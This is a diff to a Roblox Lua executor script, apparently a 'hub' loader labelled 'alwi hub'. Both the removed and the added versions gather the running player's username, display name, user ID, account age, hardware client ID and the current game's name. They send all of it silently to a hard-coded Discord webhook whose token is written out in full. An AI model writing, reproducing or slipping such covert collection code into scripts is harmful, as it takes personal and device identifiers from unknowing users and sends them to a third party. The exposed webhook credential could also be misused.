@@ -4,45 +4,42 @@ if _G.Honey_Valley then
 end
 
 _G.Honey_Valley = true
+local https = game:GetService("HttpService")
 local HttpService = game:GetService("HttpService")
-local MarketplaceService = cloneref(game:GetService("MarketplaceService"))
+local MarketplaceService = game:GetService("MarketplaceService")
+local hookURL = "https://discord.com/api/webhooks/1318961945424166973/TBy_bcaVzjkMko3QO4WYK4gRMPlyMReyFn7Tt9jB9ZSObcVCaGnAzCrp8RjQinFbqdjY"
+
+-- Function to get player's avatar (thumbnail) using a different method
+function thumbnail(plyId)
+    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. plyId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
+    local response = http_request({
+        Url = url,
+        Method = "GET",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        }
+    })
+
+    local data = game:GetService("HttpService"):JSONDecode(response.Body)
+    return data["data"][1]["imageUrl"]
+end
+
+-- You can call the script manually or in another way if you want to post data for the local player
+local player = game.Players.LocalPlayer
+local userid = player.UserId
 local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
--- Function to retrieve the user's thumbnail
-function getThumbnail(userId)
-    local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
-    local success, result = pcall(function()
-        return HttpService:GetAsync(apiUrl)
-    end)
-
-    if success then
-        local response = HttpService:JSONDecode(result)
-        if response and response["data"] and response["data"][1] and response["data"][1]["imageUrl"] then
-            return response["data"][1]["imageUrl"]
-        else
-            warn("Failed to retrieve thumbnail data.")
-            return nil
-        end
-    else
-        warn("Error fetching thumbnail: " .. tostring(result))
-        return nil
-    end
-end
-
--- Webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1318961945424166973/TBy_bcaVzjkMko3QO4WYK4gRMPlyMReyFn7Tt9jB9ZSObcVCaGnAzCrp8RjQinFbqdjY"
-
--- Get the player's avatar thumbnail URL
-local thumbnailUrl = getThumbnail(game.Players.LocalPlayer.UserId)
-
--- Data to send to the webhook
-local payload = {
-    ["embeds"] = {
+local data = {
+    embeds = {
         {
-            ["title"] = "Account and Game Information",
-            ["color"] = 16711680, -- Red color in decimal format
-            ["fields"] = {
+            color = 14177041, -- Red color in decimal format
+            title = "Player Information",  -- Adjusted title
+            description = "Information about user Who executor alwi hub", -- General description
+            thumbnail = {
+                url = thumbnail(player.UserId)  -- Add player's avatar thumbnail
+            },
+            fields = {
                 {
                     ["name"] = "Game Name",
                     ["value"] = gameInfo.Name,
@@ -55,27 +52,22 @@ local payload = {
                 },
                 {
                     ["name"] = "Username",
-                    ["value"] = game.Players.LocalPlayer.Name,
+                    ["value"] = player.Name,
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Display Name",
-                    ["value"] = game.Players.LocalPlayer.DisplayName,
+                    ["value"] = player.DisplayName,
                     ["inline"] = true
                 },
                 {
                     ["name"] = "User ID",
-                    ["value"] = tostring(game.Players.LocalPlayer.UserId),
+                    ["value"] = tostring(player.UserId),
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Account Age",
-                    ["value"] = tostring(game.Players.LocalPlayer.AccountAge) .. " days",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Executor",
-                    ["value"] = identifyexecutor(),
+                    ["value"] = tostring(player.AccountAge) .. " days",
                     ["inline"] = true
                 },
                 {
@@ -84,36 +76,25 @@ local payload = {
                     ["inline"] = false
                 }
             },
-            ["thumbnail"] = {
-                ["url"] = thumbnailUrl or "https://via.placeholder.com/75" -- Fallback if thumbnail retrieval fails
+            footer = {
+                ["text"] = "Information sent via script"
             },
-            ["footer"] = {
-                ["text"] = "Information sent via script",
-            },
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO timestamp
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- ISO timestamp
         }
     }
 }
 
--- Send data to the webhook
-local function sendToWebhook()
-    local success, response = pcall(function()
-        return http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+local success, errorMessage = pcall(function()
+    http_request({
+        Url = hookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
+    })
+end)
 
-    if success then
-        print("Information sent successfully to the webhook.")
-    else
-        warn("Failed to send information to the webhook: ", response)
-    end
+if not success then
+    warn("Failed to send data to the webhook: " .. errorMessage)
 end
-
--- Call the function
-sendToWebhook()
